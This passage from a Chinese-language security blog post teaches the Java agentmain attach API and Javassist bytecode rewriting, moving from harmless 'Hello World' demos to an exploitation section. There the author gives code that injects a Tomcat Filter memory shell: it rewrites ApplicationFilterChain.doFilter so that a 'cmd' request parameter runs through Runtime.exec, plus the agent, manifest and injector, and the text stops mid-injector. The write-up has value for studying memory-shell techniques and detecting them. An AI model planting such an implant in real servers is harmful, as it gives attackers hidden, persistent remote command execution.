class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;  </span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;  </span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Hello World!&quot;</span>);  </span><br><span class=\"line\">            sleep(<span class=\"number\">5000</span>);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编写我们的 agentmain</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Java_Agent_agentmain</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">agentmain</span><span class=\"params\">(String args, Instrumentation inst)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;调用了agentmain-Agent!&quot;</span>);</span><br><span class=\"line\">            sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>mf文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Agent-Class: com.drunkbaby.Java_Agent_agentmain</span><br></pre></td></tr></table></figure>\n\n<p>jar cvfm hello.jar META-INF&#x2F;MAINFEST.MF Java_Agent_agentmain.class</p>\n<p>然后开始注入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Inject_Agent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(vmd.displayName().equals(<span class=\"string\">&quot;com.drunkbaby.Sleep_Hello&quot;</span>))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//连接指定JVM</span></span><br><span class=\"line\">                <span class=\"type\">VirtualMachine</span> <span class=\"variable\">virtualMachine</span> <span class=\"operator\">=</span> VirtualMachine.attach(vmd.id());</span><br><span class=\"line\">                <span class=\"comment\">//加载Agent</span></span><br><span class=\"line\">                virtualMachine.loadAgent(<span class=\"string\">&quot;/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Agentmain/src/main/resources/hello.jar&quot;</span>);</span><br><span class=\"line\">                <span class=\"comment\">//断开JVM连接</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>先运行Sleep_Hello再运行Inject_Agent。输出如下。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello World!</span><br><span class=\"line\">调用了agentmain-Agent!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">调用了agentmain-Agent!</span><br><span class=\"line\">调用了agentmain-Agent!</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>但是这里我们这里只是插入，而不是改变。</p>\n</blockquote>\n<h2 id=\"动态修改字节码\"><a href=\"#动态修改字节码\" class=\"headerlink\" title=\"动态修改字节码\"></a>动态修改字节码</h2><p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p>\n<p>ClassFileTransformer接口下面有一个addTransformer方法。重写该方法即可转换任意类文件，并返回新的被取代的类文件，</p>\n<p>下面我们来修改这个正在运行的hello</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Sleep_Hello</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">            hello();</span><br><span class=\"line\">            sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">hello</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Hello World!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>一个实现了ClassFileTransformer接口的类。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Hello_Transform</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ClassFileTransformer</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"type\">byte</span>[] classfileBuffer) <span class=\"keyword\">throws</span> IllegalClassFormatException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取CtClass 对象的容器 ClassPool</span></span><br><span class=\"line\">            <span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"comment\">//添加额外的类搜索路径</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (classBeingRedefined != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"type\">ClassClassPath</span> <span class=\"variable\">ccp</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassClassPath</span>(classBeingRedefined);</span><br><span class=\"line\">                classPool.insertClassPath(ccp);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//获取目标类</span></span><br><span class=\"line\">            <span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;AgentShell.Sleep_Hello&quot;</span>);</span><br><span class=\"line\">            System.out.println(ctClass);</span><br><span class=\"line\">            <span class=\"comment\">//获取目标方法</span></span><br><span class=\"line\">            <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">            <span class=\"comment\">//设置方法体</span></span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;System.out.println(\\&quot;Hacker!\\&quot;);&#125;&quot;</span>;</span><br><span class=\"line\">            ctMethod.setBody(body);</span><br><span class=\"line\">            <span class=\"comment\">//返回目标类字节码</span></span><br><span class=\"line\">            <span class=\"type\">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>agent </p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">agentmain_transform</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">agentmain</span><span class=\"params\">(String args, Instrumentation inst)</span> <span class=\"keyword\">throws</span> InterruptedException, UnmodifiableClassException &#123;</span><br><span class=\"line\">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取目标JVM加载的全部类</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(Class cls : classes)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cls.getName().equals(<span class=\"string\">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//添加一个transformer到Instrumentation，并重新触发目标类加载</span></span><br><span class=\"line\">                inst.addTransformer(<span class=\"keyword\">new</span> <span class=\"title class_\">Hello_Transform</span>(),<span class=\"literal\">true</span>);</span><br><span class=\"line\">                inst.retransformClasses(cls);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>修改一下mf文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Agent-Class: AgentShell.agentmain_transform</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br></pre></td></tr></table></figure>\n\n<p>pom.xml  这里使用assembly生成说需要的jar包</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-assembly-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">descriptorRefs</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">descriptorRef</span>&gt;</span>jar-with-dependencies<span class=\"tag\">&lt;/<span class=\"name\">descriptorRef</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">descriptorRefs</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">archive</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">manifestFile</span>&gt;</span></span><br><span class=\"line\">            src/main/resources/META-INF/maven/MAINFEST.MF</span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">manifestFile</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">archive</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-compiler-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">source</span>&gt;</span>6<span class=\"tag\">&lt;/<span class=\"name\">source</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">target</span>&gt;</span>6<span class=\"tag\">&lt;/<span class=\"name\">target</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>先运行Sleep_Hello 再运行这个</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Inject_Agent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class=\"line\">            System.out.println(vmd.displayName());</span><br><span class=\"line\">            <span class=\"comment\">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(vmd.displayName().equals(<span class=\"string\">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;</span><br><span class=\"line\">                <span class=\"comment\">//连接指定JVM</span></span><br><span class=\"line\">                <span class=\"type\">VirtualMachine</span> <span class=\"variable\">virtualMachine</span> <span class=\"operator\">=</span> VirtualMachine.attach(vmd.id());</span><br><span class=\"line\">                <span class=\"comment\">//加载Agent</span></span><br><span class=\"line\">                virtualMachine.loadAgent(<span class=\"string\">&quot;/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Instrumentation/target/Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);</span><br><span class=\"line\">                <span class=\"comment\">//断开JVM连接</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">Hello World!</span><br><span class=\"line\">javassist.CtClassType@6ae33825[public class AgentShell.Sleep_Hello fields= constructors=javassist.CtConstructor@58966603[public Sleep_Hello ()V],  methods=javassist.CtMethod@44a4fe33[public static main ([Ljava/lang/String;)V], javassist.CtMethod@30063153[public static hello ()V], ]</span><br><span class=\"line\">Hacker!</span><br><span class=\"line\">Hacker!</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"一些利用\"><a href=\"#一些利用\" class=\"headerlink\" title=\"一些利用\"></a>一些利用</h1><h2 id=\"利用agentmain注入Filter内存马\"><a href=\"#利用agentmain注入Filter内存马\" class=\"headerlink\" title=\"利用agentmain注入Filter内存马\"></a>利用agentmain注入Filter内存马</h2><p>准备好实现了ClassFileTransformer接口的Filter_Transform</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Filter_Transform</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ClassFileTransformer</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"type\">byte</span>[] classfileBuffer) <span class=\"keyword\">throws</span> IllegalClassFormatException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//获取CtClass 对象的容器 ClassPool</span></span><br><span class=\"line\">            <span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//添加额外的类搜索路径</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (classBeingRedefined != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"type\">ClassClassPath</span> <span class=\"variable\">ccp</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassClassPath</span>(classBeingRedefined);</span><br><span class=\"line\">                classPool.insertClassPath(ccp);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//获取目标类</span></span><br><span class=\"line\">            <span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//获取目标方法</span></span><br><span class=\"line\">            <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;doFilter&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//设置方法体</span></span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;javax.servlet.http.HttpServletRequest request = $1\\n;&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;String cmd=request.getParameter(\\&quot;cmd\\&quot;);\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;if (cmd !=null)&#123;\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;  Runtime.getRuntime().exec(cmd);\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;  &#125;&quot;</span>+</span><br><span class=\"line\">                    <span class=\"string\">&quot;&#125;&quot;</span>;</span><br><span class=\"line\">            ctMethod.setBody(body);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//返回目标类字节码</span></span><br><span class=\"line\">            <span class=\"type\">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>准备agent</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">agentmain_transform</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">agentmain</span><span class=\"params\">(String args, Instrumentation inst)</span> <span class=\"keyword\">throws</span> InterruptedException, UnmodifiableClassException &#123;</span><br><span class=\"line\">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取目标JVM加载的全部类</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(Class cls : classes)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cls.getName().equals(<span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//添加一个transformer到Instrumentation，并重新触发目标类加载</span></span><br><span class=\"line\">                inst.addTransformer(<span class=\"keyword\">new</span> <span class=\"title class_\">Filter_Transform</span>(),<span class=\"literal\">true</span>);</span><br><span class=\"line\">                inst.retransformClasses(cls);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>mf文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Agent-Class: com.drunkbaby.agentmain_transform</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br></pre></td></tr></table></figure>\n\n<p>生成对应jar包,然后开始注入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Inject_Agent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, 